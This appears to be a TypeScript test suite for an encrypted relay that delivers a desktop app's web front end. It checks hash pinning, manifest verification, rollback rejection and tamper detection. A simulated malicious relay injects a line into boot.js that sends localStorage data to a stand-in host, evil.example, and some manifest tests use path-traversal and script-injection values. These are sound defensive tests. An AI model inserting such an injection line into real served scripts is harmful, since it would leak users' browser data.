import { mkdirSync, mkdtempSync, readFileSync, rmSync, utimesSync, writeFileSync } from 'node:fs';
import { createServer, request } from 'node:http';
import type { IncomingMessage, Server, ServerResponse } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import vm from 'node:vm';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { bootstrapHashes } from '../../relay/src/bootstrap-hash';
import { DEFAULT_BOOTSTRAP_DIR, createRelayServer } from '../../relay/src/server';
import type { RelayServer } from '../../relay/src/server';
import * as boot from '../../relay/bootstrap/boot.js';
import type { FrontCtx, FrontManifest, FrontStore } from '../../relay/bootstrap/boot.js';
import { BOOTSTRAP_SHA256 } from './bootstrap-hashes';
import { generateE2eKey } from './e2e-crypto';
import { FrontBundle, parseEntry } from './front-bundle';
import { RelayClient } from './relay-client';
import { checkRelayBootstrap } from './relay-integrity';
import { RelayManager } from './relay-manager';
import { generateSecrets } from './secrets';

// Front servido por el escritorio por el canal cifrado: relay REAL + cliente de túnel REAL + arranque (boot.js)
// ejecutado en Node + un relay "malicioso" de prueba que altera respuestas y arranque. Sin BD ni datos reales.

const ID = 'frontDevice0123456789abc';
const SECRET = 'frontSecret0123456789abcdefghijklmnopqrs';
const KEY = generateE2eKey();
const REG = 'token-registro-front';

let tmp: string;
let relay: RelayServer;
let relayPort: number;
let evil: Server;
let evilPort: number;
let client: RelayClient | null = null;
let mode: 'honest' | 'flip' | 'replay' | 'evilboot' | 'drop' = 'honest';
const recorded: Buffer[] = [];

/** Crea un front estilo Vite en `dir` con la marca de tiempo `mtimeSec`. */
function makeDist(dir: string, version: string, mtimeSec: number) {
  const w = (rel: string, data: string) => {
    mkdirSync(join(dir, rel, '..'), { recursive: true });
    writeFileSync(join(dir, rel), data);
    utimesSync(join(dir, rel), mtimeSec, mtimeSec);
  };
  w('index.html', '<!doctype html><html><head><script type="module" crossorigin src="/assets/index-AAA.js"></script><link rel="stylesheet" crossorigin href="/assets/index-BBB.css"></head><body><div id="root"></div></body></html>');
  w('assets/index-AAA.js', `console.log("front ${version}")`);
  w('assets/page-CCC.js', 'export default 1');
  w('assets/index-BBB.css', 'body{margin:0}');
  w('sw.js', '//no viaja');
  w('assets/index-AAA.js.map', '{}');
}

const forward = (req: IncomingMessage, res: ServerResponse) => {
  const chunks: Buffer[] = [];
  req.on('data', (c: Buffer) => chunks.push(c));
  req.on('end', () => {
    if (mode === 'drop' && req.url?.endsWith('/e')) {
      res.writeHead(503, { 'content-type': 'application/json' });
      return res.end('{"code":"pc_apagada"}');
    }
    const up = request({ host: '127.0.0.1', port: relayPort, path: req.url, method: req.method, headers: req.headers }, (r) => {
      const out: Buffer[] = [];
      r.on('data', (c: Buffer) => out.push(c));
      r.on('end', () => {
        let body = Buffer.concat(out);
        const isE = req.url?.endsWith('/e') && r.statusCode === 200;
        if (isE) {
          if (mode === 'flip') {
            body = Buffer.from(body);
            body[body.length - 1] ^= 1;
          } else if (mode === 'replay' && recorded.length) body = recorded[0];
          else if (mode === 'honest' && recorded.length < 1) recorded.push(Buffer.from(body));
        }
        if (mode === 'evilboot' && req.url === '/boot.js') body = Buffer.concat([body, Buffer.from('\nfetch("https://evil.example/?k="+localStorage.length)')]);
        const headers = { ...r.headers, 'content-length': String(body.length) };
        res.writeHead(r.statusCode ?? 502, headers);
        res.end(body);
      });
    });
    up.end(Buffer.concat(chunks));
  });
};

const until = async (cond: () => boolean, ms = 5000) => {
  const t0 = Date.now();
  while (!cond()) {
    if (Date.now() - t0 > ms) throw new Error('tiempo agotado');
    await new Promise((r) => setTimeout(r, 20));
  }
};

async function startClient(front: FrontBundle | undefined, key = KEY) {
  client?.stop();
  client = new RelayClient({
    relayUrl: `http://127.0.0.1:${relayPort}`,
    deviceId: ID,
    secret: SECRET,
    e2eKey: key,
    registrationToken: REG,
    getPort: () => 1, // no hay API: solo se prueba /_front
    front,
    backoff: { minMs: 50, maxMs: 200 },
  });
  client.start();
  await until(() => client!.state === 'conectado');
}

const mkCtx = async (key = KEY, viaEvil = true): Promise<FrontCtx> => {
  const origin = `http://127.0.0.1:${viaEvil ? evilPort : relayPort}`;
  return {
    base: `/d/${ID}`,
    deviceId: ID,
    keys: await boot.deriveKeys(key),
    fetch: (u, i) => fetch(origin + u, i),
    now: () => Date.now(),
  };
};

/** Almacén en memoria con la misma semántica que el de Cache API + localStorage. */
function memStore() {
  const s = {
    floorV: null as { builtAt: number; mh: string } | null,
    cur: null as { mh: string; manifest: FrontManifest } | null,
    files: new Map<string, Uint8Array>(),
    commits: 0,
    floor: () => s.floorV,
    current: async () => s.cur,
    commit: async (x: { manifest: FrontManifest; mh: string; files: Map<string, Uint8Array>; reuse: string[] }) => {
      const next = new Map(x.files);
      for (const p of x.reuse) next.set(p, s.files.get(p)!);
      s.files = next;
      s.cur = { mh: x.mh, manifest: x.manifest };
      s.floorV = { builtAt: x.manifest.builtAt, mh: x.mh };
      s.commits++;
    },
  };
  return s satisfies FrontStore & Record<string, unknown>;
}

const fails = async (p: Promise<unknown>, code: string) => {
  const e = await p.then(
    () => null,
    (x: unknown) => x,
  );
  expect(e).toBeInstanceOf(boot.FrontError);
  expect((e as InstanceType<typeof boot.FrontError>).code).toBe(code);
};

beforeAll(async () => {
  tmp = mkdtempSync(join(tmpdir(), 'automed-front-e2e-'));
  makeDist(join(tmp, 'v1'), '1', 1_700_000_000);
  relay = createRelayServer({ dataDir: join(tmp, 'relay-data'), cookieSecure: true, registrationToken: REG, headTimeoutMs: 3000 });
  await new Promise<void>((r) => relay.server.listen(0, '127.0.0.1', () => r()));
  relayPort = (relay.server.address() as AddressInfo).port;
  evil = createServer(forward);
  await new Promise<void>((r) => evil.listen(0, '127.0.0.1', () => r()));
  evilPort = (evil.address() as AddressInfo).port;
});

afterAll(async () => {
  client?.stop();
  await relay.close();
  evil.close();
  evil.closeAllConnections();
  rmSync(tmp, { recursive: true, force: true });
});

describe('arranque publicado', () => {
  it('el hash de apps/relay/bootstrap coincide con bootstrap-hashes.ts y con docs/relay-e2e.md', () => {
    const h = bootstrapHashes(DEFAULT_BOOTSTRAP_DIR);
    expect(h.files).toEqual(BOOTSTRAP_SHA256.files);
    expect(h.combined).toBe(BOOTSTRAP_SHA256.combined);
    const doc = readFileSync(resolve(__dirname, '../../../docs/relay-e2e.md'), 'utf8');
    for (const v of [...Object.values(h.files), h.combined]) expect(doc).toContain(v);
  });

  it('el arranque es pequeño y sin dependencias (sin import/require de paquetes)', () => {
    const js = readFileSync(join(DEFAULT_BOOTSTRAP_DIR, 'boot.js'), 'utf8');
    expect(js.split('\n').length).toBeLessThan(400);
    expect(js).not.toMatch(/\bimport\s+[^(]|require\(/);
  });

  it('el relay sirve exactamente esos bytes', async () => {
    const get = async (p: string) => Buffer.from(await (await fetch(`http://127.0.0.1:${relayPort}${p}`)).arrayBuffer());
    const sha = async (b: Buffer) => (await import('node:crypto')).createHash('sha256').update(b).digest('hex');
    expect(await sha(await get('/boot.js'))).toBe(BOOTSTRAP_SHA256.files['boot.js']);
    expect(await sha(await get(`/d/${ID}/`))).toBe(BOOTSTRAP_SHA256.files['index.html']);
    expect(await sha(await get(`/d/otro/tickets`))).toBe(BOOTSTRAP_SHA256.files['index.html']);
    expect(await sha(await get(`/d/${ID}/sw.js`))).toBe(BOOTSTRAP_SHA256.files['sw.js']);
  });
});

describe('FrontBundle', () => {
  it('parsea el index de Vite, excluye sw.js/mapas/index y no sirve rutas fuera del manifiesto', () => {
    const b = new FrontBundle(join(tmp, 'v1'), '1.0.0');
    const m = JSON.parse(b.manifest(ID).toString()) as FrontManifest;
    expect(m).toMatchObject({ v: 1, d: ID, version: '1.0.0', builtAt: 1_700_000_000_000 });
    expect(m.entry).toEqual({ scripts: ['assets/index-AAA.js'], styles: ['assets/index-BBB.css'] });
    expect(Object.keys(m.files)).toEqual(['assets/index-AAA.js', 'assets/index-BBB.css', 'assets/page-CCC.js']);
    expect(b.file('../v1/index.html')).toBeNull();
    expect(b.file('assets/index-AAA.js.map')).toBeNull();
    expect(parseEntry('<script type="module" src="./a.js"></script><link rel="modulepreload" href="/x.js">')).toEqual({ scripts: ['a.js'], styles: [] });
  });
});

describe('verificación en el arranque (boot.js)', () => {
  const good = (): FrontManifest => ({
    v: 1,
    d: ID,
    version: '1',
    builtAt: 100,
    entry: { scripts: ['a.js'], styles: [] },
    files: { 'a.js': { sha256: 'a'.repeat(64), size: 3, type: 'text/javascript; charset=utf-8' } },
  });
  const raw = (m: unknown) => new TextEncoder().encode(JSON.stringify(m));
  const verify = (m: unknown, floor: { builtAt: number; mh: string } | null = null) => boot.verifyManifest(raw(m), { deviceId: ID, floor });

  it('acepta un manifiesto válido y rechaza manipulaciones', async () => {
    expect((await verify(good())).manifest.version).toBe('1');
    await fails(boot.verifyManifest(new TextEncoder().encode('no json'), { deviceId: ID, floor: null }), 'manifiesto');
    await fails(verify({ ...good(), v: 2 }), 'manifiesto');
    await fails(verify({ ...good(), d: 'otro' }), 'manifiesto');
    await fails(verify({ ...good(), entry: { scripts: ['nada.js'], styles: [] } }), 'manifiesto');
    await fails(verify({ ...good(), entry: { scripts: [], styles: [] } }), 'manifiesto');
    await fails(verify({ ...good(), files: { '../x.js': good().files['a.js'] }, entry: { scripts: ['../x.js'], styles: [] } }), 'manifiesto');
    await fails(verify({ ...good(), files: { 'a.js': { ...good().files['a.js'], sha256: 'zz' } } }), 'manifiesto');
    await fails(verify({ ...good(), files: { 'a.js': { ...good().files['a.js'], type: 'text/html<script>' } } }), 'manifiesto');
  });

  it('rechaza una versión más vieja (retroceso) y el mismo número con otro contenido', async () => {
    const first = await verify(good());
    const floor = { builtAt: 100, mh: first.mh };
    await verify(good(), floor); // el mismo: bien
    await verify({ ...good(), builtAt: 101 }, floor); // más nuevo: bien
    await fails(verify({ ...good(), builtAt: 99 }, floor), 'version');
    await fails(verify({ ...good(), version: 'distinto' }, floor), 'version');
  });
});

describe('front por el canal cifrado (relay real)', () => {
  it('descarga, verifica y guarda; la segunda vez usa lo verificado; sin túnel y sin caché avisa', async () => {
    const store = memStore();
    await fails(boot.syncFront(await mkCtx(KEY, false), store), 'apagada');
    expect(store.commits).toBe(0);

    await startClient(new FrontBundle(join(tmp, 'v1'), '1.0.0'));
    const ctx = await mkCtx();
    const r1 = await boot.syncFront(ctx, store);
    expect(r1.source).toBe('red');
    expect([...store.files.keys()].sort()).toEqual(['assets/index-AAA.js', 'assets/index-BBB.css', 'assets/page-CCC.js']);
    expect(Buffer.from(store.files.get('assets/index-AAA.js')!).toString()).toBe('console.log("front 1")');
    const r2 = await boot.syncFront(ctx, store);
    expect(r2.source).toBe('cache');
    expect(store.commits).toBe(1);

    client!.stop();
    await until(() => !relay.tunnels.has(ID));
    mode = 'drop';
    expect((await boot.syncFront(ctx, store)).source).toBe('cache'); // PC apagado: se abre lo ya verificado
    mode = 'honest';
  });

  it('actualización: solo baja lo que cambió; retroceso o mismo número con otro contenido: se rechaza', async () => {
    const store = memStore();
    await startClient(new FrontBundle(join(tmp, 'v1'), '1.0.0'));
    await boot.syncFront(await mkCtx(), store);

    makeDist(join(tmp, 'v2'), '2', 1_700_000_100);
    await startClient(new FrontBundle(join(tmp, 'v2'), '1.1.0'));
    const r = await boot.syncFront(await mkCtx(), store);
    expect(r.source).toBe('red');
    expect(r.manifest.version).toBe('1.1.0');
    expect(Buffer.from(store.files.get('assets/index-AAA.js')!).toString()).toBe('console.log("front 2")');
    expect(Buffer.from(store.files.get('assets/page-CCC.js')!).toString()).toBe('export default 1'); // reutilizado
    expect(store.floorV!.builtAt).toBe(1_700_000_100_000);
    const before = store.cur;

    await startClient(new FrontBundle(join(tmp, 'v1'), '1.0.0')); // versión vieja
    await fails(boot.syncFront(await mkCtx(), store), 'version');
    makeDist(join(tmp, 'v3'), 'otro', 1_700_000_100); // misma fecha, otro contenido
    await startClient(new FrontBundle(join(tmp, 'v3'), '1.1.0'));
    await fails(boot.syncFront(await mkCtx(), store), 'version');
    expect(store.cur).toBe(before); // nada cambió
  });

  it('archivo alterado respecto al manifiesto: no se guarda ni se ejecuta nada', async () => {
    class Tampered extends FrontBundle {
      override file(path: string) {
        const f = super.file(path);
        return f && path.endsWith('page-CCC.js') ? { ...f, bytes: Buffer.from('export default 2') } : f;
      }
    }
    // El manifiesto sale de los archivos reales; el archivo servido difiere (mismo tamaño, otro hash).
    const store = memStore();
    await startClient(new Tampered(join(tmp, 'v1'), '1.0.0'));
    await fails(boot.syncFront(await mkCtx(), store), 'archivo');
    expect(store.commits).toBe(0);
    expect(store.cur).toBeNull();
  });

  it('clave errónea: no autentica (falla cerrado)', async () => {
    await startClient(new FrontBundle(join(tmp, 'v1'), '1.0.0'));
    const store = memStore();
    await fails(boot.syncFront(await mkCtx(generateE2eKey()), store), 'autenticacion');
    expect(store.commits).toBe(0);
  });

  it('relay malicioso: bits cambiados o respuestas repetidas de otra petición: falla cerrado, aunque haya caché', async () => {
    await startClient(new FrontBundle(join(tmp, 'v1'), '1.0.0'));
    const store = memStore();
    mode = 'honest';
    recorded.length = 0;
    await boot.syncFront(await mkCtx(), store); // guarda la primera respuesta cifrada (manifiesto)
    expect(recorded.length).toBe(1);
    const cached = store.cur;

    mode = 'flip';
    await fails(boot.syncFront(await mkCtx(), store), 'autenticacion');
    mode = 'replay';
    await fails(boot.syncFront(await mkCtx(), store), 'autenticacion');
    expect(store.cur).toBe(cached);
    mode = 'honest';
    const fresh = memStore();
    mode = 'flip';
    await fails(boot.syncFront(await mkCtx(), fresh), 'autenticacion');
    expect(fresh.commits).toBe(0);
    mode = 'honest';
  });

  it('el relay no sirve front: /_front por HTTP en claro no existe', async () => {
    const r = await fetch(`http://127.0.0.1:${relayPort}/d/${ID}/_front/manifest`);
    expect(Buffer.from(await r.arrayBuffer()).toString()).not.toContain('"entry"');
    expect((await fetch(`http://127.0.0.1:${relayPort}/d/${ID}/_app/assets/index-AAA.js`)).status).toBe(404);
  });
});

describe('comprobación del arranque desde el escritorio', () => {
  it('relay honesto -> ok; relay con boot.js alterado -> distinto; sin red -> sin_comprobar', async () => {
    mode = 'honest';
    expect(await checkRelayBootstrap(`http://127.0.0.1:${relayPort}`, ID)).toBe('ok');
    mode = 'evilboot';
    expect(await checkRelayBootstrap(`http://127.0.0.1:${evilPort}`, ID)).toBe('distinto');
    mode = 'honest';
    expect(await checkRelayBootstrap('http://127.0.0.1:9', ID, { timeoutMs: 500 })).toBe('sin_comprobar');
  });

  it('el manager expone el hash esperado y el estado de la comprobación', async () => {
    const secrets = generateSecrets();
    const m = new RelayManager({
      relayUrl: `http://127.0.0.1:${relayPort}`,
      registrationToken: REG,
      secrets,
      persist: () => {},
      checkBootstrap: async () => 'distinto',
      backoff: { minMs: 50, maxMs: 100 },
    });
    expect(m.status().arranque).toEqual({ sha256: BOOTSTRAP_SHA256.combined, estado: 'sin_comprobar' });
    m.enable();
    await until(() => m.status().arranque.estado === 'distinto');
    m.stop();
    expect(m.status().arranque.estado).toBe('sin_comprobar');
  });
});

describe('almacén del navegador (Cache API + localStorage simulados)', () => {
  const fakeEnv = () => {
    const stores = new Map<string, Map<string, { body: Uint8Array; type: string }>>();
    const ls = new Map<string, string>();
    const cache = (name: string) => ({
      put: async (url: string, r: Response) => {
        if (!stores.has(name)) stores.set(name, new Map());
        stores.get(name)!.set(url, { body: new Uint8Array(await r.arrayBuffer()), type: r.headers.get('Content-Type') ?? '' });
      },
      match: async (url: string) => {
        const e = stores.get(name)?.get(url);
        return e ? new Response(e.body, { headers: { 'Content-Type': e.type } }) : undefined;
      },
      delete: async (url: string) => stores.get(name)?.delete(url) ?? false,
    });
    return {
      stores,
      ls,
      env: {
        caches: {
          open: async (n: string) => cache(n),
          keys: async () => [...stores.keys()],
          delete: async (n: string) => stores.delete(n),
        },
        localStorage: { getItem: (k: string) => ls.get(k) ?? null, setItem: (k: string, v: string) => void ls.set(k, v), removeItem: (k: string) => void ls.delete(k) },
      },
    };
  };

  it('commit deja puntero, piso y caché; una versión nueva borra la anterior; reset lo borra todo', async () => {
    const f = fakeEnv();
    const st = boot.browserStore(`/d/${ID}`, ID, f.env);
    await startClient(new FrontBundle(join(tmp, 'v1'), '1.0.0'));
    const ctx = await mkCtx();
    expect((await boot.syncFront(ctx, st)).source).toBe('red');
    expect((await st.current())!.manifest.version).toBe('1.0.0');
    expect(st.floor()!.builtAt).toBe(1_700_000_000_000);
    const names = () => [...f.stores.keys()].filter((k) => k.startsWith(`am-front-${ID}-`));
    expect(names().length).toBe(1);
    expect(f.stores.get(names()[0])!.get(`/d/${ID}/_app/assets/index-AAA.js`)!.type).toContain('javascript');

    makeDist(join(tmp, 'v4'), '4', 1_700_000_500);
    await startClient(new FrontBundle(join(tmp, 'v4'), '2.0.0'));
    expect((await boot.syncFront(ctx, st)).source).toBe('red');
    expect(names().length).toBe(1);
    expect(Buffer.from(f.stores.get(names()[0])!.get(`/d/${ID}/_app/assets/page-CCC.js`)!.body).toString()).toBe('export default 1');

    await st.reset();
    expect(await st.current()).toBeNull();
    expect(st.floor()).toBeNull();
    expect(names().length).toBe(0);
  });
});

describe('service worker del arranque (sw.js)', () => {
  it('solo responde a la página, /boot.js y _app/; nunca a POST /e, /api ni otros', async () => {
    const listeners: Record<string, (e: unknown) => void> = {};
    const sandbox = {
      self: { registration: { scope: `http://x/d/${ID}/` }, location: { origin: 'http://x' }, addEventListener: (t: string, f: (e: unknown) => void) => (listeners[t] = f), skipWaiting: async () => {}, clients: { claim: async () => {} } },
      URL,
      Response,
      caches: { open: async () => ({ match: async () => undefined, put: async () => {} }), keys: async () => [], delete: async () => true },
      fetch: async () => new Response('red'),
    };
    vm.runInNewContext(readFileSync(join(DEFAULT_BOOTSTRAP_DIR, 'sw.js'), 'utf8'), sandbox);
    const ask = (url: string, o: { method?: string; mode?: string } = {}) => {
      let responded: Promise<Response> | null = null;
      listeners.fetch({ request: { url, method: o.method ?? 'GET', mode: o.mode ?? 'no-cors' }, respondWith: (p: Promise<Response>) => (responded = p) });
      return responded as Promise<Response> | null;
    };
    const base = `http://x/d/${ID}`;
    expect(ask(`${base}/e`, { method: 'POST' })).toBeNull();
    expect(ask(`${base}/api/threads`)).toBeNull();
    expect(ask(`${base}/api/threads`, { mode: 'navigate' })).toBeNull();
    expect(ask('http://otro/boot.js')).toBeNull();
    expect(ask(`${base}/sw.js`)).toBeNull();
    expect(ask(`${base}/manifest.webmanifest`)).toBeNull();
    expect(ask(`${base}/tickets`)).toBeNull(); // subrecurso no listado
    expect(ask(`${base}/tickets`, { mode: 'navigate' })).not.toBeNull();
    expect(ask('http://x/boot.js')).not.toBeNull();
    const front = await ask(`${base}/_app/assets/index-AAA.js`)!;
    expect(front.status).toBe(404); // sin front verificado en caché: jamás va a la red
  });
});
